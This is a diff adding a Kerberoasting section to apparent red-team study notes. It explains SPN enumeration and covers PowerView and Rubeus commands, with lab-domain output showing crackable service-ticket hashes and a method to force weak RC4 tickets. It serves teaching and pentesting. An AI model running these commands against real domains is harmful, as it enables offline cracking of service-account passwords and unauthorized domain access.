@@ -325,3 +325,203 @@ Red Teams may utilize AS-REP Roasting as part of two attack chains:
 - **Persistence**: Setting this bit on accounts would allow attackers to regain access to accounts in case of password change. This is useful because it lets the team establish persistence on boxes that are likely outside the scope of monitoring and still have a high probability of gaining access to the domain at any time. You may see this setting enabled on service accounts used by old management applications, and if discovered, the blue team may ignore them.
 - **PrivEsc**: There are many scenarios where an attacker can change any attribute of an account but not the ability to log in without knowing or resetting the password. Password resets are dangerous as they have a high probability of raising alarms. Instead of resetting the password, attackers can enable this bit and attempt to crack the account's password hash.
 
+### Kerberoasting
+
+... is an attack against service accounts that allow an attacker to perform an offline password-cracking attack against the AD account associated with the service. It is similar to AS-REP Roasting but does require prior authentication to the domain. In other words, you need a valid domain user account and password or a SYSTEM shell on a domain-joined machine to perform the attack.
+
+When a service is registered, a Service Principal Name is added to AD and is an alias to an actual AD account. The information stored in AD includes the machine name, port, and the AD Account's password hash. In a proper configuration, "Service Accounts" are utilized with these SPNs to guarantee a strong password. These accounts are like machine accounts and can even have self-rotating passwords.
+
+It is common to see SPNs tied to User Accounts because setting up Service Accounts can be tricky, and not all vendors support them. Worst of all, the service account may break things after 30 days when it attempts to rotate the password. For System Administrators, the primary focus is uptime, which often causes them to default to using "User Accounts", which is fine as long as they assign the account a strong password.
+
+During a pentest, if an SPN is found tied to a user account and cracking was unsuccessful, it should be marked as a low severity finding and just noted that this allows attackers to perform offline password cracking attacks against this accout. The potential risk here is that if, someday, this account's password is set to something weaker that an attacker can crack.
+
+#### Technical Details
+
+When the KDC responds to a TGS request, the message it sends is fully encrypted with the session key shared between the user and the KDC, so the user can decrypt it because they know it. However, the embedded TGS ticket or Service Ticket is encrypted with the service account's secret key. The user, therefore, has a piece of data encrypted with the service account's password.
+
+A user can request a Service Ticket for all available services existing on the AD environment and have those tickets encrypted with the secret of each service account in their possession.
+
+Now that they have a Service Ticket encrypted with a service account's password, the user can perform an offline brute-force attack to try to recover the password in clear text.
+
+However, most services are executed by machine accounts, which have 120 characters long randomly generated passwords, making it impractical to brute force.
+
+Luckily, sometimes services are executed by user accounts. These are the services you are interested in. A user account has a password set by a human, which is much more likely to be predictablel. These are the accounts that the Kerberoast attack targets. When SPN accounts are set to use the RC4 encrpytion algorithm, the tickets can be much easier to crack offline. You may run into organizations using only the legacy, cryptographically insecure RC4 encryption algorithm. In constrast, other mature organizations employ only AES, which can be much more challenging to crack, even on a robust password-cracking rig.
+
+#### Manual Detection
+
+You then look for user accounts exposing a service. An account that exposes a service has a SPN. It is an LDAP attribute set on the account indicating the list of existing services provided by this account. If this attribute is not empty, this account offers at least one service.
+
+Here is an LDAP filter to search for users exposing a service:
+
+```
+&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
+```
+
+This filter returns a list of users with a non-empty SPN. A small PowerShell script allows you to automate finding these accounts in an environment:
+
+```powershell
+$search = New-Object DirectoryServices.DirectorySearcher([ADSI]"")
+$search.filter = "(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
+$results = $search.Findall()
+foreach($result in $results)
+{
+    $userEntry = $result.GetDirectoryEntry()
+    Write-host "User" 
+    Write-Host "===="
+    Write-Host $userEntry.name "(" $userEntry.distinguishedName ")"
+        Write-host ""
+    Write-host "SPNs"
+    Write-Host "===="     
+    foreach($SPN in $userEntry.servicePrincipalName)
+    {
+        $SPN       
+    }
+    Write-host ""
+    Write-host ""
+}
+```
+
+The script connects to the DC and searches for all objects that match your provided filter. Each result shows you its name and the list of SPNs associated with this account.
+
+This script allows you to have a list of Kerberoastable accounts, but it does not perform a TGS request and does not extract the hash you can brute force.
+
+You can also use the `SetSpn` built-in from Windows binary to search for SPN accounts. Link: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)
+
+#### Automated Tools
+
+[PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) can be used to enumerate users with an SPN set and request the Service Ticket automatically to then output a crackable hash. You can use the following method to enumerate accounts with SPNs set.
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainUser -SPN
+
+logoncount                    : 0
+badpasswordtime               : 12/31/1600 8:00:00 PM
+description                   : Key Distribution Center Service Account
+distinguishedname             : CN=krbtgt,CN=Users,DC=inlanefreight,DC=local
+objectclass                   : {top, person, organizationalPerson, user}
+name                          : krbtgt
+primarygroupid                : 513
+objectsid                     : S-1-5-21-228825152-3134732153-3833540767-502
+samaccountname                : krbtgt
+admincount                    : 1
+codepage                      : 0
+samaccounttype                : USER_OBJECT
+showinadvancedviewonly        : True
+accountexpires                : NEVER
+cn                            : krbtgt
+whenchanged                   : 5/4/2022 8:04:31 PM
+instancetype                  : 4
+objectguid                    : a68bfed4-1ccf-4b62-8efa-63b32841c05d
+lastlogon                     : 12/31/1600 8:00:00 PM
+lastlogoff                    : 12/31/1600 8:00:00 PM
+objectcategory                : CN=Person,CN=Schema,CN=Configuration,DC=inlanefreight,DC=local
+dscorepropagationdata         : {5/4/2022 8:04:31 PM, 5/4/2022 7:49:22 PM, 1/1/1601 12:04:16 AM}
+serviceprincipalname          : kadmin/changepw
+memberof                      : CN=Denied RODC Password Replication Group,CN=Users,DC=inlanefreight,DC=local
+whencreated                   : 5/4/2022 7:49:21 PM
+iscriticalsystemobject        : True
+badpwdcount                   : 0
+useraccountcontrol            : ACCOUNTDISABLE, NORMAL_ACCOUNT
+usncreated                    : 12324
+countrycode                   : 0
+pwdlastset                    : 5/4/2022 3:49:21 PM
+msds-supportedencryptiontypes : 0
+usnchanged                    : 12782
+<SNIP>
+```
+
+You can also use PowerView to directly perform the Kerberoasting attack.
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Get-DomainUser * -SPN | Get-DomainSPNTicket -format Hashcat | export-csv .\tgs.csv -notypeinformation
+PS C:\Tools> cat .\tgs.csv
+
+"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
+"krbtgt","CN=krbtgt,CN=Users,DC=inlanefreight,DC=local","kadmin/changepw",,"$krb5tgs$18$*krbtgt$inlanefreight.local$kadmin/changepw*$B6D1ECE203852A04E57DFDD47627CDCA$D75AF1139899CA82EDA1CC6B548AACFF04DA9451F6F37E641C44F27AE2BAB86DB49F4913B5D09F447F7EEA97629A3C0FF93063F3B20273D0<SNIP>
+```
+
+Instead of the manual method, you can use the `Invoke-Kerberoast` function to perform this quickly.
+
+```powershell
+PS C:\Tools> Import-Module .\PowerView.ps1
+PS C:\Tools> Invoke-Kerberoast
+
+SamAccountName       : adam.jones
+DistinguishedName    : CN=Adam Jones,OU=Operations,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : IIS_dev/inlanefreight.local:80
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*adam.jones$INLANEFREIGHT.LOCAL$IIS_dev/inlanefreight.local:80*$D7C42CD87BEF69BA275C9642BBEA9022BE3C1<SNIP>
+
+SamAccountName       : sqldev
+DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_dev/inlanefreight.local:1443
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1443*$29A78F89AC24EADBB4532DF066B90F1D808A5<SNIP>
+
+SamAccountName       : sqlqa
+DistinguishedName    : CN=sqlqa,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_qa/inlanefreight.local:1443
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sqlqa$INLANEFREIGHT.LOCAL$MSSQL_svc_qa/inlanefreight.local:1443*$895B5A094F49081330D4AEA7C1254F37EEAD7<SNIP>
+
+SamAccountName       : sql-test
+DistinguishedName    : CN=sql-test,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQL_svc_test/inlanefreight.local:1443
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sql-test$INLANEFREIGHT.LOCAL$MSSQL_svc_test/inlanefreight.local:1443*$68F3B21822B3C16D272F38A5658E20F580037<SNIP>
+
+SamAccountName       : sqlprod
+DistinguishedName    : CN=sqlprod,OU=Service Accounts,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQLSvc/sql01:1433
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sqlprod$INLANEFREIGHT.LOCAL$MSSQLSvc/sql01:1433*$EE29DA2458CA695EC2EDE568E9918909F7A05<SNIP>
+```
+
+Another great and fast way to perform Kerberoasting is with the [Rubeus](https://github.com/GhostPack/Rubeus) tool. In Rubeu's documentation, there are various options for the [Kerberoasting attack](https://github.com/GhostPack/Rubeus#kerberoast).
+
+You can use Rubeus to Kerberoast all available users and return their hashes for offline cracking:
+
+```
+C:\Tools> C:\Tools>Rubeus.exe kerberoast /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 6
+
+
+[*] SamAccountName         : sqldev
+[*] DistinguishedName      : CN=sqldev,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : MSSQL_svc_dev/inlanefreight.local:1433
+[*] PwdLastSet             : 10/14/2022 7:00:06 AM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$MSSQL_svc_dev/inlanefreight.local:1433@INLANEFREIGHT.LOCAL*$21CF6BFCE5377C1FA957FC340261E6A3$22AC9C6E64F19D4E51E849A99DC4FC4FCE819E376045D1310393C7D26A42FFE50607C42A5F5E038E30867855091726D5E21FC0C6C49730EA32CE8BF95EB6158D30796D016CCF6BA7E5A8825DECFBD9D619917BC9BF7B2A6E53380563DDC5BF24DDEE8B38D5F869DE6682BA2C762520434027485919F8F364F8B9D84B91C3D1EA8EECA64F5C9690276A6211F5CE6C4AEA57ADB06188BE5E538DAC82C3F7EE708188B3E4FD452C06FA41022317E97E9B840B93E4A03E7429D60FC4F8EB7546597B516695BDEB010CA3FEB5A25E36BEC787044DFB19117616D76DAE523248DF55DC2513C05788B27BCE31A3FF38E820F63BB491ECCA2563799C9C4563576B22EEB703E09B68AA95EC50CD234BFDF479027415A58C48D024611E281DDD9355FFBF02BA277B10D6D5D347BFB751FA6101FFE915A<SNIP>
+```
+
+You can also Kerberoast a specific user and write te result to a file using the flag `/oufile:filename.txt`.
+
+You could use the `/pwdsetafter` and `/pwdsetbefore` arguments to Kerberoast accounts whose password was set within a particular date; this can be helpful to you, as sometimes you find legacy accounts with a password set many years ago that is outside of the current password policy and relatively easy to crack.
+
+You can use the `/stats` flag to list statistics about Kerberoastable accounts without sending any ticket requests. This can be useful for gathering information and checking the types of encryption the account tickets use.
+
+The `/tgtdeleg` flag can be useful for you in situations where you find accounts with the options `This account supports Kerberos AES 128-bit encryption` or `This account supports Kerberos AES 256-bit encryption` set, meaning that when you perform a Kerberoast attack, you will get a `AES-128 (type 17)` or `AES-256 (type 18)` TGS ticket back which can be significantly more difficult to crack than `RC4 (type 23)` tickets. You will know the difference because an RC4 encrypted ticket will return a hash that starts with the`$krb5tgs$23$*` prefix, while AES encrypted tickets will give you a hash that begins with `$krb5tgs$18$`.
+
+In cases where you receive the hash of the account with AES encryption, you can use `/tgtdeleg` flag with Rubeus to force RC4 encryption. This may work in some domains where RC4 is built-in as a failsafe for backward compatibility with older services. If successful, you may get a password hash that could crack minutes or even hours faster than if you were trying to crack an AES-encrypted hash.
+
